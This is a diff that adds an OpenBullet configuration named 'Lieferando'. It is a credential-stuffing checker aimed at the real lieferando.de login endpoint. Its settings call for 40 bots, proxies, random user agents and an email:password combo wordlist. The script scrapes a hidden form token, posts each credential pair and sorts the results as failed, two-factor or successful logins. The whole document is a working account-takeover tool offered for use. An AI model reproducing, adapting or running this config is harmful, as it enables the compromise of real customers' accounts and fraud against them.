@@ -1,0 +1,101 @@
+[SETTINGS]
+{
+  "Name": "Lieferando",
+  "SuggestedBots": 40,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-05T07:47:04.0438186-08:00",
+  "AdditionalInfo": "",
+  "Author": "MrBlackX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#User-Agent FUNCTION GetRandomUA -> VAR "UA" 
+
+#Get-Value REQUEST POST "https://www.lieferando.de/xHttp/CustomerPanel.php" 
+  CONTENT "open=login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.lieferando.de" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: 10" 
+  HEADER "Origin: https://www.lieferando.de" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.lieferando.de/meinaccount/my-details" 
+  HEADER "TE: Trailers" 
+
+#Value-List PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"" "\"" Recursive=TRUE -> VAR "Lst" 
+
+SET VAR "Var" "<Lst[2]>"
+
+#Value-Item PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"<Var>\" value=\"" "\" />" -> VAR "Var2" 
+
+#Length FUNCTION Length "open=login&action=customerlogin&<Var>=<Var2>&redirect=myaccount&username=<USER>&password=<PASS>" -> VAR "Length" 
+
+#Login REQUEST POST "https://www.lieferando.de/xHttp/Auth/login.php" 
+  CONTENT "open=login&action=customerlogin&<Var>=<Var2>&redirect=myaccount&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.lieferando.de" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <Length>" 
+  HEADER "Origin: https://www.lieferando.de" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.lieferando.de/meinaccount/my-details" 
+  HEADER "TE: Trailers" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Deine Anmeldung ist fehlgeschlagen. Kontrolliere Deinen Benutzernamen (E-Mail) und/oder Dein Passwort und versuche es erneut." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Wir haben deinen Sicherheitscode an <b><USER></b> gesendet. " 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" NotEqualTo "https://www.lieferando.de/xHttp/Auth/login.php" 
+
